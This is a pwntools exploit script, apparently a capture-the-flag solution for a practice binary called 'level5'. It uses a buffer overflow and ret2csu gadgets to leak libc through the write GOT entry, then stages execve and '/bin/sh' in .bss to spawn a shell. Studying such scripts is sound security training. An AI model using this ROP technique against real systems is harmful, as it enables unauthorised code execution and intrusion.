from pwn import *

# context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = b'b' * 8  # 改为字节串


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = b'a' * 0x80 + fakeebp  # 全部改为字节串
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38  # 改为字节串
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil(b'Hello, World\n')  # 改为字节串
# RDI, RSI, RDX, RCX, R8, R9, more on the stack
# write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
# libc = LibcSearcher('write', write_addr)
libc = ELF("./libc.so")
# 修正：使用 symbols 而不是 dump
libc_base = write_addr - libc.symbols['write']
execve_addr = libc_base + libc.symbols['execve']
log.success('execve_addr ' + hex(execve_addr))
# gdb.attach(sh)

# read(0,bss_base,16)
# read execve_addr and /bin/sh\x00
sh.recvuntil(b'Hello, World\n')  # 改为字节串
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')  # 改为字节串

sh.recvuntil(b'Hello, World\n')  # 改为字节串
# execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()